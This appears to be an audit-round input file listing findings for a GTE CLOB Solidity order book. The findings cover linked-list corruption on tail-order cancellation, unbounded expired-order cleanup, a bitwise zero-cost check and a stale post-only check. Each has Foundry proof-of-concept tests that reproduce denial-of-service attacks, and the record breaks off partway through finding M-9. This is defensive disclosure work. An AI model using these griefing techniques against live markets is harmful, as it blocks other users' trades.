# 2025-07-gte-clob Round Input

Source report: `/Users/apmfree/Desktop/CHAIN SHIELD/ai-agent-audit/2025-07-gte-clob/report/audit-report.md`
Finding count: `63`

## Findings

### M-1 / `U2Hhi3vbiZqDpjxJh6hmv`
- Finding title: Broken same-price order links let a maker cancel the tail order and brick the best price level
- Report lines: 472-618
```md
## [M-1]. Broken same-price order links let a maker cancel the tail order and brick the best price level

## id: U2Hhi3vbiZqDpjxJh6hmv

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
CLOB / BookLib.postLimitOrder, cancel, _updateLimitPostOrder, _updateLimitRemoveOrder

## Finding Status: Valid
### Finding Status Justification: The same-price append and cancel flow is present in production scope. BookLib writes the new order to storage before assigning the predecessor pointer, so appended orders are stored with prevOrderId == 0. Cancel uses the stored order, and _updateLimitRemoveOrder interprets prevOrderId == 0 as head removal. For a tail with nextOrderId == 0, this leaves a nonempty limit with zero head and tail while the price remains indexed. Matching can then hit the null order and fail with ZeroCostTrade. No complete safeguard blocks a permissionless maker from posting and cancelling their own tail.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a second order is appended to an existing price level, BookLib stores the order before setting its prevOrderId. The later assignment only mutates the memory copy, so the appended order is stored with prevOrderId == 0:

```
self.orders[order.id] = order;
...
Order storage tailOrder = self.orders[limit.tailOrder];
tailOrder.nextOrderId = order.id;
order.prevOrderId = tailOrder.id;
limit.tailOrder = order.id;
```

If the appended maker cancels their order while another order remains at the same price, _updateLimitRemoveOrder treats it as the head because prev is zero and next is zero, setting both limit.headOrder and limit.tailOrder to zero while limit.numOrders remains nonzero and the price stays in the red-black tree. The best price then points to a null order, so matching returns baseDelta == 0 and fill orders revert with ZeroCostTrade. A permissionless maker can therefore cheaply poison the best bid or ask with a recoverable same-price order cancellation.

## Impact
The attacker can make all fills crossing the poisoned best price revert, blocking one side of the market until the orphaned earlier maker manually cancels. No assets are directly stolen, but market availability and maker order execution are materially impacted.

## Proof of Concept
1. Victim posts an ask at the best ask price.
2. Attacker posts another ask at the same price, becoming the tail order.
3. Attacker cancels only their tail order.
4. Because the attacker's stored prevOrderId is zero, the limit's headOrder and tailOrder are both set to zero even though the victim order still exists and the ask price remains indexed.
5. Any buyer crossing that price hits the null head order and reverts with ZeroCostTrade instead of matching the victim order.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {IAccountManager} from "contracts/account-manager/IAccountManager.sol";
import {MarketConfig, MarketSettings, Limit} from "contracts/clob/types/Book.sol";
import {Order, Side, OrderIdLib} from "contracts/clob/types/Order.sol";
import {FeeTiers} from "contracts/clob/types/FeeData.sol";

contract MockAccountManager is IAccountManager {
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
    function getAccountBalance(address, address) external pure returns (uint256) { return 0; }
    function getEventNonce() external pure returns (uint256) { return 0; }
    function getTotalFees(address) external pure returns (uint256) { return 0; }
    function getUnclaimedFees(address) external pure returns (uint256) { return 0; }
    function getFeeTier(address) external pure returns (FeeTiers) { return FeeTiers.ZERO; }
    function getSpotTakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function getSpotMakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function deposit(address, address, uint256) external {}
    function withdraw(address, address, uint256) external {}
    function depositFromRouter(address, address, uint256) external {}
    function withdrawToRouter(address, address, uint256) external {}
    function registerMarket(address) external {}
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
    function collectFees(address, address) external pure returns (uint256) { return 0; }
    function setSpotAccountFeeTier(address, FeeTiers) external {}
    function setSpotAccountFeeTiers(address[] calldata, FeeTiers[] calldata) external {}
    function creditAccount(address, address, uint256) external {}
    function creditAccountNoEvent(address, address, uint256) external {}
    function debitAccount(address, address, uint256) external {}
}

contract CLOBLinkedListDoSTest is Test {
    using OrderIdLib for *;

    CLOB clob;
    uint256 constant PRICE = 1e18;
    uint256 constant AMOUNT = 100;
    address victim = address(0xA11CE);
    address attacker = address(0xB0B);
    address buyer = address(0xCAFE);

    function setUp() public {
        MockAccountManager am = new MockAccountManager();
        clob = new CLOB(address(this), address(0x7777), address(am), 1000);
        clob.initialize(
            MarketConfig({quoteToken: address(0x1), baseToken: address(0x2), quoteSize: 1e18, baseSize: 1e18}),
            MarketSettings({status: true, maxLimitsPerTx: 100, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}),
            address(this)
        );
    }

    function testTailCancelPoisonsBestAsk() public {
        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({
            amountInBase: AMOUNT,
            price: PRICE,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        });

        vm.prank(victim);
        clob.postLimitOrder(victim, ask);
        vm.prank(attacker);
        clob.postLimitOrder(attacker, ask);

        uint256 attackerOrderId = 2;
        uint256[] memory ids = new uint256[](1);
        ids[0] = attackerOrderId;
        vm.prank(attacker);
        clob.cancel(attacker, ICLOB.CancelArgs({orderIds: ids}));

        Limit memory poisoned = clob.getLimit(PRICE, Side.SELL);
        assertEq(poisoned.numOrders, 1);
        assertEq(poisoned.headOrder.unwrap(), 0);
        assertEq(poisoned.tailOrder.unwrap(), 0);

        Order memory victimOrder = clob.getOrder(1);
        assertEq(victimOrder.owner, victim);
        assertEq(victimOrder.amount, AMOUNT);

        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        vm.prank(buyer);
        clob.postFillOrder(
            buyer,
            ICLOB.PostFillOrderArgs({
                amount: AMOUNT,
                priceLimit: PRICE,
                side: Side.BUY,
                amountIsBase: true,
                fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
            })
        );
    }
}

## Suggested Mitigation
Store the appended order's prevOrderId before writing it to storage, or update self.orders[order.id].prevOrderId after the tail is known. Add invariant tests that every nonempty limit has nonzero head/tail pointers and that canceling head, middle, and tail orders preserves the linked list.
```

### M-2 / `ntTDyuzQFbVoG65j59b0Y`
- Finding title: Tail cancellation corrupts same-price order queue and bricks matching at that price
- Report lines: 619-665
```md
## [M-2]. Tail cancellation corrupts same-price order queue and bricks matching at that price

## id: ntTDyuzQFbVoG65j59b0Y

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
BookLib/CLOB.BookLib.addOrderToBook / CLOB.cancel

## Finding Status: Valid
### Finding Status Justification: BookLib.addOrderToBook calls _updateBookPostOrder, which stores the order, then _updateLimitPostOrder mutates only the memory Order to set prevOrderId. The stored appended order therefore has no predecessor. If the appended tail is cancelled, _updateLimitRemoveOrder sees prev == 0 and next == 0, sets both limit pointers to zero, decrements numOrders, and leaves the price tree entry because the limit was not a singleton at the start. Matching at that best price then reads order zero and breaks with zero fill. No safeguard prevents the path.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a new order is appended behind an existing order, the order is written to storage before its prevOrderId is assigned. The later assignment only mutates the memory copy, so the stored tail order keeps prevOrderId == 0. Vulnerable snippet: `self.orders[order.id] = order;` in `_updateBookPostOrder`, followed later by `order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;` in `_updateLimitPostOrder`. If that tail is cancelled, `_updateLimitRemoveOrder` treats it as the head because `prev` is zero and sets `limit.headOrder = next`, which is also zero for a tail. The price level remains in the red-black tree with `numOrders == 1`, but `headOrder == 0`; matching then reads the null order, computes `baseDelta == 0`, and breaks without reaching real liquidity.

## Impact
A permissionless attacker can post behind a victim at the best price and cancel their own order, stranding the victim's order and blocking taker fills through that price level. The attacker recovers their locked funds on cancel, while the victim's order is no longer reachable by normal matching until the victim cancels.

## Proof of Concept
1. Victim posts a best ask at price P. 2. Attacker posts a second ask at the same price P, becoming the tail. 3. Because the stored attacker order has prevOrderId == 0, attacker cancels it and the limit head/tail become zero while numOrders remains one. 4. A buyer submits a fill crossing P. 5. Matching sees the corrupted price as best ask, loads order 0, returns zero fill, and reverts with ZeroCostTrade instead of filling the victim.

## Proof of Code
function testTailCancelCorruptsLimitAndBlocksFill() public {
    uint256 price = 1e18;
    uint256 amount = 100e18;
    uint256 victimOrderId = _postAsk(victim, amount, price, 0);
    uint256 attackerOrderId = _postAsk(attacker, amount, price, 0);
    _cancel(attacker, attackerOrderId);
    Limit memory limit = clob.getLimit(price, Side.SELL);
    assertEq(limit.numOrders, 1);
    assertEq(OrderId.unwrap(limit.headOrder), 0);
    assertEq(clob.getOrder(victimOrderId).owner, victim);
    vm.expectRevert(CLOB.ZeroCostTrade.selector);
    _fillBid(taker, amount, price);
}

## Suggested Mitigation
Store the appended order after setting its prevOrderId, or update `self.orders[order.id].prevOrderId` in storage after assigning the tail. Add invariant tests for head/tail/middle removals at multi-order price levels.
```

### M-3 / `OWYDJ_ICDupdBAfo1R4VA`
- Finding title: Expired minimum-price orders can force unbounded cleanup before any CLOB buy can reach live asks
- Report lines: 666-719
```md
## [M-3]. Expired minimum-price orders can force unbounded cleanup before any CLOB buy can reach live asks

## id: OWYDJ_ICDupdBAfo1R4VA

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB._matchIncomingBid / _removeExpiredAsk

## Finding Status: Valid
### Finding Status Justification: _matchIncomingBid removes expired best asks inside an unbounded while loop and continues without reducing incomingOrder.amount. There is no per-call cap, no order-count cap per price level, and no standalone bounded cleanup function in the supplied code. maxLimitsPerTx only limits placements per transaction, not accumulated expired orders. If enough expired orders sit before live liquidity, a crossing buy must clear them in one transaction or revert and roll back cleanup. The path is permissionless and in scope.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Matching removes expired top-of-book orders inside an unbounded loop before it can trade against later live liquidity: `while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) { ... if (bestAskOrder.isExpired()) { _removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue; } ... }`. Expired removals do not decrease the incoming amount, and if the cleanup grows beyond the block gas limit the transaction reverts and all removals are undone. Because there is no public bounded cleanup function and no admin cancel, an attacker can place many short-expiry asks at the minimum tick, wait for expiry, and make every buy order clear the entire expired prefix before reaching any live ask at a higher price.

## Impact
A permissionless attacker can brick buy-side progress for a market by making required matching cleanup exceed block gas. Live asks behind the expired minimum-price queue cannot be reached, and the protocol has no bounded third-party cleanup path.

## Proof of Concept
1. Attacker posts many small ask orders at the minimum valid ask price with a near-term cancelTimestamp. 2. The orders expire and remain as the best ask. 3. Honest makers post live asks at higher prices. 4. Any buyer with a price limit high enough to reach the live asks enters `_matchIncomingBid`, but must first remove every expired minimum-price ask. 5. Once the expired queue is large enough, the fill transaction runs out of gas and reverts, restoring the expired orders and keeping the market stuck.

## Proof of Code
// Add this test to the CLOBLinkedListPOC file above; it reuses the same mock harness.
function test_expiredAskCleanupIsUnboundedAndCanBlockLiveLiquidity() public {
    for (uint256 i; i < 80; ++i) {
        vm.prank(attacker);
        clob.postLimitOrder(attacker, ICLOB.PostLimitOrderArgs({amountInBase: 100, price: 1, cancelTimestamp: uint32(block.timestamp + 1), side: Side.SELL, clientOrderId: uint96(i + 1), limitOrderType: ICLOB.LimitOrderType.POST_ONLY}));
    }
    vm.warp(block.timestamp + 2);

    vm.prank(victim);
    clob.postLimitOrder(victim, ICLOB.PostLimitOrderArgs({amountInBase: 100, price: 2, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY}));

    bytes memory data = abi.encodeCall(ICLOB.postFillOrder, (buyer, ICLOB.PostFillOrderArgs({amount: 100, priceLimit: 2, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL})));
    vm.prank(buyer);
    (bool ok,) = address(clob).call{gas: 250000}(data);

    assertEq(ok, false);
    (, uint256 bestAsk) = clob.getTOB();
    assertEq(bestAsk, 1);
    assertGt(clob.getNumAsks(), 80);
}

## Suggested Mitigation
Add a bounded public cleanup function for expired top-of-book orders, cap the number of expired removals per matching call, and let callers resume cleanup across transactions. Alternatively, make matching skip expired levels/orders with pagination and avoid reverting all cleanup when no trade occurs.
```

### M-4 / `qeqdYm-KXE7yOpIWJSlb9`
- Finding title: Expired top-of-book orders require unbounded cleanup before any matching can proceed
- Report lines: 720-766
```md
## [M-4]. Expired top-of-book orders require unbounded cleanup before any matching can proceed

## id: qeqdYm-KXE7yOpIWJSlb9

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB._matchIncomingBid / _matchIncomingAsk

## Finding Status: Valid
### Finding Status Justification: The code removes expired top-of-book orders only during matching and does so inside unbounded while loops. maxNumLimitsPerSide limits price levels, not FIFO depth at a price, and maxLimitsPerTx is not a lifetime cap. An attacker can place many minimum-size orders at the best price, let them expire, and force every crossing taker to process all removals before live liquidity. If gas is exhausted, the transaction reverts and the expired orders remain. There is no complete bounded cleanup safeguard.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The matching loops remove expired top-of-book orders inline and continue until a non-expired order is reached or the side is empty. There is no pagination, per-price order cap, cleanup limit, or standalone bounded expiry-removal path. Vulnerable snippet: `while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) { ... if (bestAskOrder.isExpired()) { _removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue; } ... }`. A single price level can contain an unbounded number of orders because `maxNumLimitsPerSide` limits price levels, not orders within a level, and `maxLimitsPerTx` only limits placements per transaction.

## Impact
An attacker can accumulate many soon-expiring minimum-size orders at the best price. After expiry, every taker crossing that price must clear the entire expired queue before reaching live liquidity. Once the queue is large enough, matching exceeds the block gas limit and the market side is functionally stuck.

## Proof of Concept
1. Attacker posts thousands of minimum-size asks at the current best ask with a near-future cancelTimestamp. 2. The orders expire. 3. A buyer submits any fill order whose price crosses that ask. 4. `_matchIncomingBid` repeatedly calls `_removeExpiredAsk` and never reduces incoming amount while removing expired orders. 5. The transaction runs out of gas and reverts, so no expired orders are removed and the next taker hits the same failure.

## Proof of Code
function testExpiredOrderQueueGasDoS() public {
    uint256 price = 1e18;
    uint256 amount = 100e18;
    for (uint256 i; i < 3000; ++i) {
        _postAsk(attacker, amount, price, uint32(block.timestamp + 1));
    }
    vm.warp(block.timestamp + 2);
    ICLOB.PostFillOrderArgs memory args = ICLOB.PostFillOrderArgs({amount: amount, priceLimit: price, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL});
    vm.prank(taker);
    (bool ok,) = address(clob).call{gas: 500000}(abi.encodeCall(ICLOB.postFillOrder, (taker, args)));
    assertEq(ok, false);
    assertGt(clob.getNumAsks(), 0);
}

## Suggested Mitigation
Add bounded expiry cleanup with a maximum number of removals per call, expose permissionless paginated cleanup, cap orders per price level, or require a bond/fee that funds cleanup. Matching should be able to stop after bounded cleanup without permanently blocking later progress.
```

### M-5 / `Fj0qTYNYHzzhvXQcrR0IJ`
- Finding title: Bitwise zero-cost check reverts valid crossing limit trades with nonzero base and quote amounts
- Report lines: 767-840
```md
## [M-5]. Bitwise zero-cost check reverts valid crossing limit trades with nonzero base and quote amounts

## id: Fj0qTYNYHzzhvXQcrR0IJ

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath / PricePrecisionOrRoundingError

## Exploit Type
IntegerMath

## Location
CLOB._processLimitBidOrder, _processLimitAskOrder

## Finding Status: Valid
### Finding Status Justification: The in-scope limit-order processors use baseTokenAmountReceived & quoteTokenAmountSent == 0, and the ask path mirrors it. In Solidity, this checks bitwise overlap, not whether either amount is zero. Valid nonzero pairs with disjoint binary bits can therefore revert with ZeroCostTrade. The fill-order paths use explicit zero checks, confirming there is no universal safeguard. A permissionless maker can choose valid price and amount combinations that trigger the predicate for crossing limit orders.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The zero-cost guard in limit-order processing uses bitwise AND instead of checking whether either matched side is zero. Vulnerable snippets: `if (baseTokenAmountReceived != quoteTokenAmountSent && baseTokenAmountReceived & quoteTokenAmountSent == 0) revert ZeroCostTrade();` and the symmetric ask path. This evaluates as a bitwise disjointness test, so valid nonzero fills such as base=128 and quote=256 revert because `128 & 256 == 0`. Fill orders use the correct `totalQuoteSent == 0 || totalBaseReceived == 0` check, so the bug is specific to crossing limit orders.

## Impact
A maker can place liquidity whose matched base/quote values are nonzero but bitwise-disjoint, causing every crossing limit order against it to revert. This denies a core order type at the top of book and can be repeated cheaply with valid market parameters.

## Proof of Concept
1. Configure a valid market with `baseSize = 1`, `tickSize = 1`, and `lotSizeInBase = 1`.
2. Attacker posts a sell order for 128 base at price 2.
3. A taker submits a crossing buy limit order for 128 base at price 2.
4. Matching produces `baseTokenAmountReceived = 128` and `quoteTokenAmountSent = 256`, both nonzero.
5. The bitwise guard sees `128 & 256 == 0` and reverts with `ZeroCostTrade`, so the valid trade cannot execute.

## Proof of Code
// Add this test to the CLOBLinkedListPoC test file above; it reuses the same mocks and _deploy helper.
function test_bitwiseZeroCostGuardRevertsValidNonZeroLimitFill() public {
    CLOB clob = _deploy();
    address maker = address(0xA11CE);
    address taker = address(0xB0B);

    vm.prank(maker);
    clob.postLimitOrder(
        maker,
        ICLOB.PostLimitOrderArgs({
            amountInBase: 128,
            price: 2,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        })
    );

    assertEq(clob.getQuoteTokenAmount(2, 128), 256);
    assertEq(uint256(128) & uint256(256), 0);

    vm.expectRevert(CLOB.ZeroCostTrade.selector);
    vm.prank(taker);
    clob.postLimitOrder(
        taker,
        ICLOB.PostLimitOrderArgs({
            amountInBase: 128,
            price: 2,
            cancelTimestamp: 0,
            side: Side.BUY,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED
        })
    );
}

## Suggested Mitigation
Replace the bitwise condition with a logical zero-side check: `if ((baseTokenAmountReceived == 0) != (quoteTokenAmountSent == 0)) revert ZeroCostTrade();` or simply require both matched amounts to be nonzero when a match occurred. Add tests for nonzero base/quote pairs with disjoint binary representations.
```

### L-6 / `cOtLAQEI7uTkuEyPPoAZh`
- Finding title: Expired top-of-book orders are checked before expiry cleanup, blocking valid post-only orders
- Report lines: 841-913
```md
## [L-6]. Expired top-of-book orders are checked before expiry cleanup, blocking valid post-only orders

## id: cOtLAQEI7uTkuEyPPoAZh

## Derived From Pattern/Invariant
MaturityorGatingByPass: expired orders must not be treated as active gating liquidity

## Exploit Type
Dos

## Location
CLOB._executeBidLimitOrder / _executeAskLimitOrder

## Finding Status: Valid
### Finding Status Justification: _executeBidLimitOrder and _executeAskLimitOrder perform the POST_ONLY crossing check against ds.getBestAskPrice or ds.getBestBidPrice before calling _matchIncomingBid/_matchIncomingAsk, where expired orders are lazily removed. OrderLib.isExpired only affects matching cleanup, not the post-only gate. A permissionless user can leave an expired order at top of book; a post-only order crossing that stale price reverts even though the order would be removed before a real fill. No code path prunes expired top-of-book orders before this gate.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Post-only validation checks the current best price before matching has a chance to remove expired liquidity:

`if (limitOrderType == LimitOrderType.POST_ONLY && ds.getBestAskPrice() <= newOrder.price) revert PostOnlyOrderWouldFill();`

The matching loops remove expired head orders only later in `_matchIncomingBid` / `_matchIncomingAsk`. Therefore, an expired best ask or bid is still treated as active liquidity for the post-only gate. A permissionless user can place a minimum-size order with a near-term `cancelTimestamp`, let it expire at the best price, and then post-only orders crossing that stale price revert even though no live order would be filled.

## Impact
Makers using post-only orders can be cheaply blocked from quoting competitively at or through an expired best price. The stale order can be cleared only by a non-post-only matching path or by the order owner, creating a griefing vector against the intended maker flow.

## Proof of Concept
1. Attacker posts a minimum-size best ask with `cancelTimestamp = block.timestamp`.
2. In the next block the order is expired but remains at the best ask because expiry cleanup is lazy.
3. A maker submits a post-only bid at that ask price.
4. `_executeBidLimitOrder` checks `getBestAskPrice() <= newOrder.price` before removing the expired ask and reverts with `PostOnlyOrderWouldFill`.
5. The post-only order would not actually fill against live liquidity if expiry cleanup ran first.

## Proof of Code
function test_expiredBestAskBlocksPostOnlyBidBeforeCleanup() public {
    address attacker = address(0xA11CE);
    address maker = address(0xB0B);
    uint256 price = 10;

    mockAccountManager.setBalance(attacker, baseToken, 1);
    mockAccountManager.setBalance(maker, quoteToken, 10);

    vm.prank(attacker);
    clob.postLimitOrder(attacker, ICLOB.PostLimitOrderArgs({
        amountInBase: 1,
        price: price,
        cancelTimestamp: uint32(block.timestamp),
        side: Side.SELL,
        clientOrderId: 0,
        limitOrderType: ICLOB.LimitOrderType.POST_ONLY
    }));

    vm.warp(block.timestamp + 1);

    vm.prank(maker);
    vm.expectRevert(CLOB.PostOnlyOrderWouldFill.selector);
    clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({
        amountInBase: 1,
        price: price,
        cancelTimestamp: 0,
        side: Side.BUY,
        clientOrderId: 0,
        limitOrderType: ICLOB.LimitOrderType.POST_ONLY
    }));
}

## Suggested Mitigation
Before enforcing the post-only crossing check, prune expired head orders at the current best price, or make the post-only check inspect the best non-expired order. Keep the cleanup bounded, for example by removing expired head orders only while they are at the best price and a configured iteration cap is not exceeded.
```

### M-8 / `SNePL7SCfZJ5uSjAhF0yD`
- Finding title: Cancelling a tail order corrupts CLOB price-level links and leaves the best price unmatchable
- Report lines: 959-1088
```md
## [M-8]. Cancelling a tail order corrupts CLOB price-level links and leaves the best price unmatchable

## id: SNePL7SCfZJ5uSjAhF0yD

## Derived From Pattern/Invariant
AccountingInvariantViolation / StateGrowthOrStorageBloat

## Exploit Type
AccountingInvariantViolation

## Location
CLOB / BookLib.postLimitOrder, cancel, _matchIncomingAsk/_matchIncomingBid

## Finding Status: Valid
### Finding Status Justification: BookLib persists the new order before the appended-order prevOrderId is assigned. The only persisted link is the old tail's nextOrderId. When the appended tail is cancelled, _updateLimitRemoveOrder treats the stored order as having no predecessor and no successor, leaving the limit head and tail as zero while the price remains indexed. Matching subsequently reads orders[0] and fails to fill. The attack can be performed by a permissionless maker using ordinary post and cancel calls, and the code has no full safeguard.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib stores the new order before assigning its prevOrderId, so appended orders are persisted with prevOrderId == 0. Vulnerable snippet: `self.orders[order.id] = order;` in `_updateBookPostOrder`, then later `_updateLimitPostOrder` does `tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;` only in memory. When the appended tail is cancelled, `_updateLimitRemoveOrder` treats it as the head because `prevOrderId` is zero, sets `limit.headOrder = 0`, and leaves `limit.numOrders == 1` plus the price still present in the red-black tree. Matching then reads a null head order at the best price, gets `baseDelta == 0`, and breaks without reaching real liquidity.

## Impact
A permissionless maker can brick one side of a market's top-of-book with two minimum-size orders. Fill orders crossing that side revert with `ZeroCostTrade`, and crossing limit orders can no longer consume the stale best price. Existing live orders at that price become unreachable through normal matching until their owner cancels or the attacker unblocks the level.

## Proof of Concept
1. Attacker posts two sell orders at the same best ask price.
2. The second order is appended behind the first, but its stored `prevOrderId` remains zero.
3. Attacker cancels the second order.
4. The limit now has `numOrders == 1` but `headOrder == 0` and `tailOrder == 0`; the ask tree still reports that price as best ask.
5. Any buy fill order at that price reads the null head order, matches zero, and reverts.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/proxy/ERC1967/ERC1967Proxy.sol";
import {CLOB, ICLOB, MarketConfig, MarketSettings, Limit, OrderIdLib, Side} from "contracts/clob/CLOB.sol";
import {ICLOBManager, SettingsParams} from "contracts/clob/ICLOBManager.sol";
import {IAccountManager} from "contracts/account-manager/IAccountManager.sol";
import {IOperator} from "contracts/utils/interfaces/IOperator.sol";
import {FeeTiers} from "contracts/clob/types/FeeData.sol";

contract MockAccountManager is IAccountManager, IOperator {
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
    function approveOperator(address, uint256) external {}
    function disapproveOperator(address, uint256) external {}
    function getAccountBalance(address, address) external pure returns (uint256) { return 0; }
    function getEventNonce() external pure returns (uint256) { return 0; }
    function getTotalFees(address) external pure returns (uint256) { return 0; }
    function getUnclaimedFees(address) external pure returns (uint256) { return 0; }
    function getFeeTier(address) external pure returns (FeeTiers) { return FeeTiers.ZERO; }
    function getSpotTakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function getSpotMakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function deposit(address, address, uint256) external {}
    function withdraw(address, address, uint256) external {}
    function depositFromRouter(address, address, uint256) external {}
    function withdrawToRouter(address, address, uint256) external {}
    function registerMarket(address) external {}
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
    function collectFees(address, address) external pure returns (uint256) { return 0; }
    function setSpotAccountFeeTier(address, FeeTiers) external {}
    function setSpotAccountFeeTiers(address[] calldata, FeeTiers[] calldata) external {}
    function creditAccount(address, address, uint256) external {}
    function creditAccountNoEvent(address, address, uint256) external {}
    function debitAccount(address, address, uint256) external {}
}

contract MockManager is ICLOBManager {
    function beacon() external pure returns (address) { return address(0); }
    function getMarketAddress(address, address) external pure returns (address) { return address(0); }
    function isMarket(address) external pure returns (bool) { return true; }
    function createMarket(address, address, SettingsParams calldata) external pure returns (address) { return address(0); }
    function setMaxLimitsPerTx(ICLOB[] calldata, uint8[] calldata) external {}
    function setTickSizes(ICLOB[] calldata, uint256[] calldata) external {}
    function setMinLimitOrderAmounts(ICLOB[] calldata, uint256[] calldata) external {}
    function getMaxLimitExempt(address) external pure returns (bool) { return false; }
    function setAccountFeeTiers(address[] calldata, FeeTiers[] calldata) external {}
    function setMaxLimitsExempt(address[] calldata, bool[] calldata) external {}
}

contract CLOBLinkedListPoC is Test {
    using OrderIdLib for *;
    address attacker = address(0xA11CE);
    address taker = address(0xB0B);

    function _deploy() internal returns (CLOB clob) {
        MockAccountManager am = new MockAccountManager();
        MockManager manager = new MockManager();
        CLOB impl = new CLOB(address(manager), address(0x999), address(am), 1000);
        MarketConfig memory cfg = MarketConfig(address(0x1), address(0x2), 1, 1);
        MarketSettings memory st = MarketSettings(true, 250, 1, 1, 1);
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), abi.encodeCall(CLOB.initialize, (cfg, st, address(this))));
        clob = CLOB(address(proxy));
    }

    function _ask(uint256 amount, uint256 price) internal pure returns (ICLOB.PostLimitOrderArgs memory) {
        return ICLOB.PostLimitOrderArgs(amount, price, 0, Side.SELL, 0, ICLOB.LimitOrderType.POST_ONLY);
    }

    function test_tailCancelCorruptsBestAskAndBlocksFills() public {
        CLOB clob = _deploy();
        vm.prank(attacker); clob.postLimitOrder(attacker, _ask(10, 5));
        vm.prank(attacker); clob.postLimitOrder(attacker, _ask(10, 5));

        Limit memory beforeCancel = clob.getLimit(5, Side.SELL);
        assertEq(beforeCancel.numOrders, 2);
        assertEq(OrderIdLib.unwrap(clob.getOrder(2).prevOrderId), 0, "tail prev was never persisted");

        uint256[] memory ids = new uint256[](1);
        ids[0] = 2;
        vm.prank(attacker); clob.cancel(attacker, ICLOB.CancelArgs(ids));

        Limit memory corrupted = clob.getLimit(5, Side.SELL);
        assertEq(corrupted.numOrders, 1);
        assertEq(OrderIdLib.unwrap(corrupted.headOrder), 0);
        (, uint256 minAsk) = clob.getTOB();
        assertEq(minAsk, 5, "tree still points at corrupted price");

        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        vm.prank(taker);
        clob.postFillOrder(taker, ICLOB.PostFillOrderArgs(1, 5, Side.BUY, true, ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL));
    }
}

## Suggested Mitigation
Persist the linked-list pointers after they are assigned. Move `self.orders[order.id] = order` after `_updateLimitPostOrder` has set `order.prevOrderId`, or update `self.orders[order.id].prevOrderId` in storage when appending. Add invariant tests that cancel head, middle, and tail orders at multi-order limits and assert reachable list length, head/tail pointers, tree membership, and open interest remain consistent.
```

### M-9 / `3QpPKCdYzCkBLpAcsNNz6`
- Finding title: Appended order cancellation corrupts a price level and makes older resting orders unmatchable
- Report lines: 1089-1185
```md
## [M-9]. Appended order cancellation corrupts a price level and makes older resting orders unmatchable

## id: 3QpPKCdYzCkBLpAcsNNz6

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
BookLib.addOrderToBook / removeOrderFromBook

## Finding Status: Valid
### Finding Status Justification: BookLib stores the new order before setting its previous pointer. The subsequent order.prevOrderId = tailOrder.id modifies only memory, leaving the stored appended order with prevOrderId == 0. If that order is canceled, _updateLimitRemoveOrder treats it as head and tail and sets headOrder and tailOrder to zero while limit.numOrders remains nonzero and the earlier order still exists. Matching then reads orders[0] and cannot fill the older order. The issue is in production in-scope code, has no complete safeguard, and is reachable through public order placement and cancellation.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
